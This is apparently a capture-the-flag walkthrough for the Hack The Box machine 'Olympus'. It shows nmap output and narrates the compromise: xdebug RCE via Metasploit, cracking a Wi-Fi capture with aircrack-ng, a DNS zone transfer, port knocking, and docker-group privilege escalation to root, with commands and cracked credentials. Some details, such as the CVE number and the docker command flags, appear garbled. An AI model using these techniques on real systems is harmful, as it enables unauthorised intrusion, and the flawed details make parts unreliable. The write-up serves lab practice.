Started with a nmap scan
```
PORT     STATE    SERVICE REASON         VERSION
22/tcp   filtered ssh     no-response
53/tcp   open     domain  syn-ack ttl 62 (unknown banner: Bind)
| dns-nsid: 
|_  bind.version: Bind
| fingerprint-strings: 
|   DNSVersionBindReqTCP: 
|     version
|     bind
|_    Bind
80/tcp   open     http    syn-ack ttl 62 Apache httpd
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-favicon: Unknown favicon MD5: 399EAE2564C19BD20E855CDB3C0C9D1B
|_http-server-header: Apache
|_http-title: Crete island - Olympus HTB
2222/tcp open     ssh     syn-ack ttl 62 (protocol 2.0)
| ssh-hostkey: 
|   2048 f2:ba:db:06:95:00:ec:05:81:b0:93:60:32:fd:9e:00 (RSA)
| fingerprint-strings: 
|   NULL: 
|_    SSH-2.0-City of olympia
```
Going to the webserver its just a picture running a gobuster scan and not finding anything running a UDP scan with nmap to see if there is anything else `53` is also on UDP looking at the headers the webserver is running `xdebug` version `2.5.5` which has a RCE exploit `CVE-2015-10141` and there is a metasploit module to exploit this and now we are `www-data` and were in a docker container looking around the system there is a `pcap` file in `/home/zeus/airgeddon/captured` we need to get this pcap back to are host machine looking at the pcap file there is a SSID `Too_cl0se_to_th3_Sun`  and we can use `aircrack-ng` to crack this `aircrack-ng Too_cl0se_to_th3_Sun -w rockyou.txt captured.cap` and it cracked to `flightoficarus` now we can ssh as the user `icarus` and the password is the name of the wifi point to port `2222` and were still in a container but there is a note in the home folder which has a domain and we can use the DNS on the machine to try and dns zone transfer and see all the subdomains `dig axfr @10.10.10.83 ctfolympus.htb` and one of the entries hints to port knocking `3456 8234 62431` and `st34l_th3_F1re!` and we hit those port and now ssh is open and now we can ssh into the host as the user `prometheus` and we are apart of the `docker` group so if we run `docker run -v /:/hostOS -i -r rodhes bash` and now we are root  